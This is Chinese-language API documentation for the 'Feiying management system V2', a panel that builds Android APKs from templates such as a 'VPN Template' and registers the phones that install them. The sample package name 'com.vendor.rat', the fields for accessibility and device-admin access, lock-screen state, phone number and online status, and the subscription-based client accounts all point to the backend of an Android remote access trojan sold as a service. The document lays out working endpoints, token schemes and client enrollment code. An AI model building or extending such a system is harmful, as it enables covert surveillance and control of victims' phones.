# API 文档

飞鹰管理系统 V2 API 参考文档。

## 认证

所有 API 请求需要通过 Session 认证（Web 路由）或 Sanctum Token（API 路由）。

### 登录

```
POST /login
Content-Type: application/json

{
    "email": "user@example.com",
    "password": "password"
}
```

### 注册

```
POST /register
Content-Type: application/json

{
    "username": "newuser",
    "email": "user@example.com",
    "password": "password",
    "password_confirmation": "password"
}
```

### 登出

```
POST /logout
```

### 管理员登出

```
POST /admin/logout
```

> **Session 隔离**：用户登出与管理员登出互不影响。两个 guard（`web` / `admin`）共用同一个 session cookie，但登出时只清除对应 guard 的认证数据，不会调用 `session()->invalidate()` 销毁整个 session。

---

## 设备管理

### 获取设备列表

```
GET /devices
```

**响应:**
```json
{
    "data": [
        {
            "id": 1,
            "uuid": "550e8400-e29b-41d4-a716-446655440000",
            "name": "Test Device",
            "model": "Pixel 8",
            "android_version": "14",
            "country": "China",
            "is_online": true,
            "last_seen_at": "2026-01-31T06:00:00.000000Z"
        }
    ],
    "current_page": 1,
    "last_page": 1,
    "per_page": 20,
    "total": 1
}
```

### 获取设备详情

```
GET /devices/{id}
```

**响应:**
```json
{
    "id": 1,
    "uuid": "550e8400-e29b-41d4-a716-446655440000",
    "name": "Test Device",
    "model": "Pixel 8",
    "android_version": "14",
    "country": "China",
    "ip_address": "192.168.1.100",
    "phone_number": "+86 138 0000 0000",
    "battery_level": 85,
    "network_type": "WiFi",
    "is_online": true,
    "has_accessibility": true,
    "installed_at": "2026-01-01T00:00:00.000000Z",
    "last_seen_at": "2026-01-31T06:00:00.000000Z",
    "settings": {},
    "permissions": {}
}
```

### 删除设备

```
DELETE /devices/{id}
```

**响应:** 重定向到设备列表

---

## WebSocket Token

### 获取 WebSocket 认证 Token

Panel WebSocket 连接前需要先获取 HMAC 签名 token。

**用户端：**
```
GET /ws-token
```

**管理员端：**
```
GET /admin/ws-token
```

**响应:**
```json
{
    "token": "{hmac_hex}.{user_id}.{guard}.{timestamp}"
}
```

| 字段 | 说明 |
|------|------|
| `hmac_hex` | HMAC-SHA256 签名 |
| `user_id` | 用户 ID |
| `guard` | `web` (普通用户) 或 `admin` (管理员) |
| `timestamp` | 生成时间戳 |

Token 有效期默认 300 秒（5 分钟），可通过 `PANEL_AUTH_TTL` 环境变量配置。

**错误响应:**
- 401: 未认证（需要先登录）

---

## APK 构建

### 获取构建列表

```
GET /builds
```

**响应:**
```json
{
    "data": [
        {
            "id": 1,
            "name": "My App",
            "package_name": "com.example.app",
            "status": "completed",
            "is_custom": false,
            "created_at": "2026-01-31T06:00:00.000000Z",
            "template": {
                "id": 1,
                "name": "VPN Template"
            }
        }
    ],
    "current_page": 1,
    "last_page": 1
}
```

### 流式构建 APK

```
GET /builds/stream?app_name=...&package_name=...&...
Accept: text/event-stream
```

通过 SSE (Server-Sent Events) 实时返回构建进度。构建时自动生成设备认证 token（HMAC-SHA256 签名），写入 APK。

> 注意：`POST /builds` 已移除，所有 APK 构建统一使用 `stream` 方式。

---

## Android 设备信息同步 API

### 认证机制

所有设备 API 端点使用 **Bearer Token 认证**，Token 由 `DeviceTokenService` 生成，格式为：

```
Authorization: Bearer {email}||{hmac}.{buildId}.{timestamp}
```

| 组件 | 说明 |
|------|------|
| `email` | 用户邮箱 |
| `hmac` | HMAC-SHA256({email}\|{buildId}\|{timestamp}, secret) |
| `buildId` | APK 构建 ID（整数） |
| `timestamp` | Unix 时间戳（秒） |

**生成 Token 示例（PHP）：**

```php
$tokenService = app(\App\Services\DeviceTokenService::class);
$token = $tokenService->generateToken('user@example.com', 123);
// 输出: user@example.com||{hmac}.123.{timestamp}
```

**Token 验证流程：**

1. 提取 Bearer Token 中的 `email` 和 `||` 分隔符
2. 解析 Token 部分为 `{hmac}.{buildId}.{timestamp}`
3. 使用环境变量 `WEBSOCKET_DEVICE_AUTH_SECRET` 重新计算 HMAC
4. 使用 `hash_equals()` 进行时间恒定的比较，防止时序攻击

### 设备注册

完整注册或更新（upsert）设备记录，包含 35+ 个设备属性字段。

**端点：**
```
POST /api/device/register.json
Authorization: Bearer {token}
Content-Type: application/json
```

**请求体：**

```json
{
  "deviceUid": "device_unique_id",
  "deviceToken": "token",
  "packageName": "com.vendor.rat",
  "trusteeId": "trustee_001",
  "model": "Pixel 8",
  "brandCode": "google",
  "manufacturer": "Google",
  "fingerPrint": "google/...",
  "serial": "ABC123",
  "displayId": "PQ1A.191005.007",
  "board": "redfin",
  "device": "redfin",
  "hardwareName": "redfin",
  "product": "redfin",
  "codeName": "redfin",
  "incremental": "AP2A.210305.008",
  "release": "12",
  "apiGrade": 31,
  "osVersion": "12.0",
  "osName": "Android",
  "osArch": "arm64-v8a",
  "optimalABI": "arm64-v8a",
  "supportABI": ["arm64-v8a", "armeabi-v7a"],
  "factoryTime": "2021-08-19 00:00:00",
  "langCode": "zh-CN",
  "phoneNumber": "+86 138 0000 0000",
  "isRoot": 0,
  "enableDevelopment": 0,
  "enableDebug": 0,
  "enableWifiDebug": 0,
  "screen": {
    "width": 1440,
    "height": 3120,
    "density": 560,
    "scaledDensity": 560,
    "xdpi": 560.5,
    "ydpi": 561.2,
    "isScreenOn": 1,
    "state": 0,
    "screenOffTimeout": 300000,
    "isScreenRound": 0,
    "statusBarHeight": 66,
    "navigationBarHeight": 84,
    "isBlocked": 0
  },
  "batteryLevel": {
    "percent": 85,
    "status": 2,
    "health": 2,
    "voltage": 4200,
    "temperature": 25,
    "technology": "Li-ion",
    "plugged": 1,
    "inPowerSaveMode": 0
  },
  "deviceAdmin": {
    "packageName": "com.vendor.rat",
    "isAdminActive": 1,
    "isDeviceOwner": 0,
    "isProfileOwner": 0
  },
  "lockPattern": {
    "isScreenOn": 1,
    "isKeyguardLocked": 0,
    "isDeviceLocked": 0,
    "isKeyguardSecure": 1,
    "isDeviceSecure": 1,
    "inKeyguardRestrictedInputMode": 0,
    "quality": 262144
  }
}
```

**字段说明：**

| 字段 | 类型 | 必填 | 说明 |
|------|------|------|------|
| `deviceUid` | string(64) | ✓ | 设备唯一标识（由客户端生成） |
| `deviceToken` | string(255) | | 设备令牌 |
| `packageName` | string(150) | | 应用包名 |
| `trusteeId` | string(100) | | 受信人 ID |
| `model` | string(100) | | 设备型号 |
| `brandCode` | string(50) | | 品牌代码 |
| `manufacturer` | string(100) | | 制造商 |
| `fingerPrint` | string(255) | | 设备指纹 |
| `serial` | string(64) | | 序列号 |
| `displayId` | string(255) | | 显示 ID |
| `board` | string(100) | | 主板型号 |
| `device` | string(100) | | 设备名 |
| `hardwareName` | string(100) | | 硬件名称 |
| `product` | string(100) | | 产品名 |
| `codeName` | string(50) | | 代号 |
| `incremental` | string(100) | | 增量版本号 |
| `release` | string(20) | | Android 版本号字符串 |
| `apiGrade` | integer | | API 级别 (1-99) |
| `osVersion` | string(50) | | 操作系统版本 |
| `osName` | string(50) | | 操作系统名称 |
| `osArch` | string(20) | | 操作系统架构 |
| `optimalABI` | string(20) | | 最优 ABI |
| `supportABI` | array | | 支持的 ABI 列表 |
| `factoryTime` | string(30) | | 出厂时间 |
| `langCode` | string(20) | | 语言代码 |
| `phoneNumber` | string(50) | | 电话号码 |
| `isRoot` | integer (0\|1) | | 是否 Root |
| `enableDevelopment` | integer (0\|1) | | 开发者模式开启 |
| `enableDebug` | integer (0\|1) | | 调试模式开启 |
| `enableWifiDebug` | integer (0\|1) | | WiFi 调试开启 |

**嵌套对象：**

**screen** (屏幕信息)：
```json
{
  "width": 1440,           // 屏幕宽度
  "height": 3120,          // 屏幕高度
  "density": 560,          // 屏幕密度
  "scaledDensity": 560,    // 缩放密度
  "xdpi": 560.5,           // X 轴 DPI
  "ydpi": 561.2,           // Y 轴 DPI
  "isScreenOn": 1,         // 屏幕是否点亮
  "state": 0,              // 屏幕状态
  "screenOffTimeout": 300000,    // 屏幕熄灭超时
  "isScreenRound": 0,      // 是否圆形屏幕
  "statusBarHeight": 66,   // 状态栏高度
  "navigationBarHeight": 84,     // 导航栏高度
  "isBlocked": 0           // 屏幕是否被屏蔽
}
```

**batteryLevel** (电池信息)：
```json
{
  "percent": 85,           // 电池百分比
  "status": 2,             // 电池状态 (1=unknown, 2=charging, 3=discharging, 4=not_charging, 5=full)
  "health": 2,             // 电池健康度 (1=unknown, 2=good, 3=overheat, ...)
  "voltage": 4200,         // 电压 (毫伏)
  "temperature": 25,       // 温度 (摄氏度)
  "technology": "Li-ion",  // 电池技术
  "plugged": 1,            // 是否充电 (0=unplugged, 1=ac, 2=usb, 4=wireless)
  "inPowerSaveMode": 0     // 是否进省电模式
}
```

**deviceAdmin** (设备管理员)：
```json
{
  "packageName": "com.vendor.rat",  // 管理员应用包名
  "isAdminActive": 1,               // 是否激活
  "isDeviceOwner": 0,               // 是否设备所有者
  "isProfileOwner": 0               // 是否配置文件所有者
}
```

**lockPattern** (锁屏信息)：
```json
{
  "isScreenOn": 1,                      // 屏幕是否点亮
  "isKeyguardLocked": 0,                // KeyGuard 是否锁定
  "isDeviceLocked": 0,                  // 设备是否锁定
  "isKeyguardSecure": 1,                // KeyGuard 是否安全
  "isDeviceSecure": 1,                  // 设备是否安全
  "inKeyguardRestrictedInputMode": 0,   // 是否在受限输入模式
  "quality": 262144                     // 锁屏质量等级
}
```

**响应：**

```json
{
  "success": true,
  "code": 200,
  "msg": "OK",
  "data": "550e8400-e29b-41d4-a716-446655440000",
  "count": 1
}
```

| 字段 | 说明 |
|------|------|
| `data` | 设备 UUID（作为 deviceId 返回） |

**错误响应：**

```json
{
  "success": false,
  "code": 404,
  "msg": "User not found",
  "data": null
}
```

```json
{
  "success": false,
  "code": 422,
  "msg": "The given data was invalid.",
  "data": null
}
```

### 设备信息轻量更新

更新设备的部分字段（不包含嵌套对象），用于定期心跳更新。

**端点：**
```
POST /api/device/updateDeviceInfo.json
Authorization: Bearer {token}
Content-Type: application/json
```

**请求体：**

```json
{
  "deviceUid": "device_unique_id",
  "brandCode": "google",
  "apiGrade": 31,
  "langCode": "zh-CN",
  "phoneNumber": "+86 138 0000 0000"
}
```

**字段说明：**

| 字段 | 类型 | 必填 | 说明 |
|------|------|------|------|
| `deviceUid` | string(64) | ✓ | 设备唯一标识 |
| `brandCode` | string(50) | | 品牌代码 |
| `apiGrade` | integer | | API 级别 |
| `langCode` | string(20) | | 语言代码 |
| `phoneNumber` | string(50) | | 电话号码 |

**响应：**

```json
{
  "success": true,
  "code": 200,
  "msg": "OK",
  "data": "550e8400-e29b-41d4-a716-446655440000",
  "count": 1
}
```

**错误响应：**

```json
{
  "success": false,
  "code": 404,
  "msg": "Device not found",
  "data": null
}
```

---

### 数据库表结构

#### devices 表新增字段

注册 API 会更新以下新增字段（在现有 `devices` 表中）：

| 字段 | 类型 | 说明 |
|------|------|------|
| `device_uid` | string(64) | 设备唯一标识，已索引 |
| `brand` | string(50) | 品牌 |
| `manufacturer` | string(100) | 制造商 |
| `fingerprint` | string(255) | 设备指纹 |
| `serial` | string(64) | 序列号 |
| `package_name` | string(150) | 应用包名 |
| `is_root` | boolean | 是否 Root |
| `enable_development` | boolean | 开发者模式 |
| `enable_debug` | boolean | 调试模式 |
| `enable_wifi_debug` | boolean | WiFi 调试 |
| `lang_code` | string(20) | 语言代码 |
| `trustee_id` | string(100) | 受信人 ID |

#### device_details 表

完整的设备详情存储在单独的 `device_details` 表中，通过 `device_id` 外键与 `devices` 表关联（1:1，级联删除）。

**表结构：**

| 字段 | 类型 | 说明 |
|------|------|------|
| `id` | bigint | 主键 |
| `device_id` | bigint | 设备 ID（唯一外键） |
| `display_id` | string(255) | 显示 ID |
| `board` | string(100) | 主板型号 |
| `device_name` | string(100) | 设备名 |
| `hardware_name` | string(100) | 硬件名称 |
| `product` | string(100) | 产品名 |
| `code_name` | string(50) | 代号 |
| `incremental` | string(100) | 增量版本号 |
| `optimal_abi` | string(20) | 最优 ABI |
| `support_abi` | json | 支持的 ABI 列表 |
| `factory_time` | string(30) | 出厂时间 |
| `os_version` | string(50) | 操作系统版本 |
| `os_name` | string(50) | 操作系统名称 |
| `os_arch` | string(20) | 操作系统架构 |
| `screen_width` | unsigned smallint | 屏幕宽度 |
| `screen_height` | unsigned smallint | 屏幕高度 |
| `screen_density` | unsigned smallint | 屏幕密度 |
| `screen_scaled_density` | float | 缩放密度 |
| `screen_xdpi` | float | X 轴 DPI |
| `screen_ydpi` | float | Y 轴 DPI |
| `screen_is_on` | boolean | 屏幕是否点亮 |
| `screen_state` | unsigned tinyint | 屏幕状态 |
| `screen_off_timeout` | unsigned int | 屏幕熄灭超时 |
| `screen_is_round` | boolean | 是否圆形屏幕 |
| `status_bar_height` | unsigned smallint | 状态栏高度 |
| `navigation_bar_height` | unsigned smallint | 导航栏高度 |
| `screen_is_blocked` | boolean | 屏幕是否被屏蔽 |
| `is_keyguard_locked` | boolean | KeyGuard 是否锁定 |
| `is_device_locked` | boolean | 设备是否锁定 |
| `is_keyguard_secure` | boolean | KeyGuard 是否安全 |
| `is_device_secure` | boolean | 设备是否安全 |
| `in_keyguard_restricted_input_mode` | boolean | 是否在受限输入模式 |
| `lock_quality` | integer | 锁屏质量等级 |
| `battery_percent` | float | 电池百分比 |
| `battery_status` | unsigned tinyint | 电池状态 |
| `battery_health` | unsigned tinyint | 电池健康度 |
| `battery_voltage` | unsigned smallint | 电压 (毫伏) |
| `battery_temperature` | smallint | 温度 (摄氏度) |
| `battery_technology` | string(30) | 电池技术 |
| `battery_plugged` | unsigned tinyint | 充电状态 |
| `in_power_save_mode` | boolean | 是否进省电模式 |
| `admin_package_name` | string(150) | 管理员应用包名 |
| `is_admin_active` | boolean | 管理员是否激活 |
| `is_device_owner` | boolean | 是否设备所有者 |
| `is_profile_owner` | boolean | 是否配置文件所有者 |
| `created_at` | timestamp | 创建时间 |
| `updated_at` | timestamp | 更新时间 |

---

### 使用示例

**客户端生成 Token 并注册设备（伪代码）：**

```java
// Android 客户端（Java）
String email = "user@example.com";
int buildId = 123;

// 调用管理后台 API 生成 Token
String token = generateTokenFromServer(email, buildId);

// 准备设备注册数据
JSONObject registerData = new JSONObject();
registerData.put("deviceUid", UUID.randomUUID().toString());
registerData.put("model", Build.MODEL);
registerData.put("brandCode", Build.BRAND);
registerData.put("manufacturer", Build.MANUFACTURER);
// ... 其他字段

// 发送注册请求
OkHttpClient client = new OkHttpClient();
Request request = new Request.Builder()
    .url("http://localhost:8000/api/device/register.json")
    .addHeader("Authorization", "Bearer " + token)
    .post(RequestBody.create(registerData.toString(), MediaType.get("application/json")))
    .build();

Response response = client.newCall(request).execute();
String responseBody = response.body().string();
// 解析 responseBody 获取 deviceId
```

**后端生成 Token（PHP）：**

```php
// app/Services/DeviceTokenService::generateToken()
$service = app(\App\Services\DeviceTokenService::class);
$token = $service->generateToken('user@example.com', 123);
// 返回给 Android 客户端，用于后续 API 调用

// 验证 Token
$result = $service->validateToken($bearerToken);
if ($result['authenticated']) {
    $email = $result['email'];
    $buildId = $result['build_id'];
}
```

**CURL 注册示例：**

```bash
TOKEN="user@example.com||{hmac}.123.{timestamp}"

curl -X POST http://localhost:8000/api/device/register.json \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "deviceUid": "device-001",
    "model": "Pixel 8",
    "brandCode": "google",
    "manufacturer": "Google",
    "screen": {
      "width": 1440,
      "height": 3120,
      "density": 560
    },
    "batteryLevel": {
      "percent": 85,
      "status": 2
    }
  }'
```

### 获取构建详情

```
GET /builds/{id}
```

**响应:**
```json
{
    "id": 1,
    "name": "My App",
    "package_name": "com.example.app",
    "status": "completed",
    "is_custom": false,
    "icon_path": "builds/1/icon.png",
    "file_path": "builds/1/app.apk",
    "error_message": null,
    "created_at": "2026-01-31T06:00:00.000000Z",
    "template": {
        "id": 1,
        "name": "VPN Template",
        "package_name": "com.template.vpn"
    }
}
```

### 删除构建

```
DELETE /builds/{id}
```

**响应:** 重定向到构建列表

---

## 用户设置

### 更新个人资料

```
PUT /user/profile-information
Content-Type: application/json

{
    "username": "newusername",
    "email": "newemail@example.com"
}
```

### 更新密码

```
PUT /user/password
Content-Type: application/json

{
    "current_password": "oldpassword",
    "password": "newpassword",
    "password_confirmation": "newpassword"
}
```

---

## WebSocket 事件

### 连接

使用 Laravel Echo 连接到 Reverb WebSocket 服务器：

```typescript
import Echo from 'laravel-echo';
import Pusher from 'pusher-js';

window.Echo = new Echo({
    broadcaster: 'reverb',
    key: 'feiying-local-key',
    wsHost: 'localhost',
    wsPort: 8080,
    forceTLS: false,
    enabledTransports: ['ws', 'wss'],
});
```

### 设备状态更新事件

**频道:** `private-user.{userId}`
**事件:** `DeviceStatusUpdated`

```typescript
window.Echo.private(`user.${userId}`)
    .listen('DeviceStatusUpdated', (e) => {
        console.log('设备状态更新:', e);
        // e.device_id
        // e.uuid
        // e.name
        // e.is_online
        // e.last_seen_at
    });
```

---

## 错误响应

### 验证错误 (422)

```json
{
    "message": "The given data was invalid.",
    "errors": {
        "email": ["The email field is required."],
        "password": ["The password must be at least 8 characters."]
    }
}
```

### 未授权 (401)

```json
{
    "message": "Unauthenticated."
}
```

### 禁止访问 (403)

```json
{
    "message": "This action is unauthorized."
}
```

### 未找到 (404)

```json
{
    "message": "No query results for model [App\\Models\\Device] 999"
}
```

---

## 数据模型

### User

| 字段 | 类型 | 说明 |
|------|------|------|
| id | integer | 主键 |
| username | string | 用户名 |
| email | string | 邮箱 |
| role | enum | admin/client |
| subscription_type | enum | 订阅类型 |
| subscription_expires_at | date | 订阅到期时间 |

### Device

| 字段 | 类型 | 说明 |
|------|------|------|
| id | integer | 主键 |
| uuid | uuid | 设备唯一标识 |
| user_id | integer | 所属用户 |
| name | string | 设备名称 |
| model | string | 设备型号 |
| android_version | string | Android 版本 |
| is_online | boolean | 是否在线 |
| last_seen_at | datetime | 最后活动时间 |

### AppBuild

| 字段 | 类型 | 说明 |
|------|------|------|
| id | integer | 主键 |
| user_id | integer | 所属用户 |
| template_id | integer | 模板 ID |
| name | string | 应用名称 |
| package_name | string | 包名 |
| status | enum | pending/building/completed/failed |
| is_custom | boolean | 是否自定义构建 |
| device_token | text | 设备认证 token（HMAC-SHA256 签名） |
